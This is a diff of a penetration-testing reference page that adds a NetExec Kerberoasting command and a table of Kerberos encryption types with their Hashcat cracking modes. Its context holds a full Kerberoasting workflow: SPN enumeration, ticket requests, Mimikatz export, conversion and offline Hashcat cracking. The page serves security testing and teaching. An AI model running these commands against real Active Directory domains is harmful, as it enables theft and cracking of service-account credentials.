@@ -3489,6 +3489,15 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#netexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      NetExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#powershell-mimikatz" class="md-nav__link">
     <span class="md-ellipsis">
       PowerShell + Mimikatz
@@ -5197,6 +5206,15 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#netexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      NetExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#powershell-mimikatz" class="md-nav__link">
     <span class="md-ellipsis">
       PowerShell + Mimikatz
@@ -5362,31 +5380,73 @@
 <ul>
 <li><code>-outputfile</code> send output to file</li>
 </ul>
+<h4 id="netexec"><strong>NetExec</strong></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--kerberoasting<span class="w"> </span>&lt;OUTFILE&gt;
+</span></code></pre></div>
 <h4 id="powershell-mimikatz"><strong>PowerShell</strong> + Mimikatz</h4>
 <p>Identify kerberoastable users.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>setspn.exe -Q */*
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>setspn.exe -Q */*
 </span></code></pre></div>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.domain.local:1433&quot;</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;MSSQLSvc/DEV-PRE-SQL.domain.local:1433&quot;</span>
 </span></code></pre></div>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">mimikatz</span> <span class="c"># base64 /out:true</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">mimikatz</span> <span class="c"># kerberos::list </span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">mimikatz</span> <span class="c"># base64 /out:true</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">mimikatz</span> <span class="c"># kerberos::list </span>
 </span></code></pre></div>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">echo </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span> <span class="p">|</span>  <span class="n">tr</span> <span class="n">-d</span> <span class="p">\\</span><span class="n">n</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">echo </span><span class="s2">&quot;&lt;base64 blob&gt;&quot;</span> <span class="p">|</span>  <span class="n">tr</span> <span class="n">-d</span> <span class="p">\\</span><span class="n">n</span>
 </span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>cat<span class="w"> </span>encoded_file<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>sqldev.kirbi
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>cat<span class="w"> </span>encoded_file<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>&gt;<span class="w"> </span>sqldev.kirbi
 </span></code></pre></div>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>python2.7<span class="w"> </span>kirbi2john.py<span class="w"> </span>sqldev.kirbi
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python2.7<span class="w"> </span>kirbi2john.py<span class="w"> </span>sqldev.kirbi
 </span></code></pre></div>
 <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>sed<span class="w"> </span><span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39;</span><span class="w"> </span>crack_file<span class="w"> </span>&gt;<span class="w"> </span>sqldev_tgs_hashcat
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sed<span class="w"> </span><span class="s1">&#39;s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/&#39;</span><span class="w"> </span>crack_file<span class="w"> </span>&gt;<span class="w"> </span>sqldev_tgs_hashcat
 </span></code></pre></div>
 <h3 id="cracking-a-ticket">Cracking a ticket</h3>
-<p>Kerberos 5 TGS-REP (etype 23, RC4-HMAC-MD5)</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashes.txt<span class="w"> </span>/path/to/wordlist.txt
-</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Encryption Type (etype)</th>
+<th>Name / Algorithm</th>
+<th>Hashcat Mode</th>
+<th>Notes / Where Seen</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>23</code></td>
+<td>RC4-HMAC (arcfour-hmac-md5)</td>
+<td><strong>13100</strong></td>
+<td>Default for older AD, common in Kerberoasting. Weak, fastest to crack.</td>
+</tr>
+<tr>
+<td><code>17</code></td>
+<td>AES128-CTS-HMAC-SHA1-96</td>
+<td><strong>19600</strong></td>
+<td>Seen when RC4 is disabled; newer/modern service accounts.</td>
+</tr>
+<tr>
+<td><code>18</code></td>
+<td>AES256-CTS-HMAC-SHA1-96</td>
+<td><strong>19700</strong></td>
+<td>Stronger; common when "AES only" enforced.</td>
+</tr>
+<tr>
+<td><code>3</code></td>
+<td>DES-CBC-MD5</td>
+<td><em>Obsolete</em> (no current Hashcat mode)</td>
+<td>Legacy, should be disabled.</td>
+</tr>
+<tr>
+<td><code>RC4-HMAC-OLD</code> / <code>etype 24</code></td>
+<td>RC4-HMAC with old salt usage (rare)</td>
+<td>Use <strong>13100</strong></td>
+<td>Rare edge cases, still cracks with RC4 mode.</td>
+</tr>
+</tbody>
+</table>
 <h3 id="cleanup-considerations">Cleanup Considerations</h3>
 <ul>
 <li>None</li>
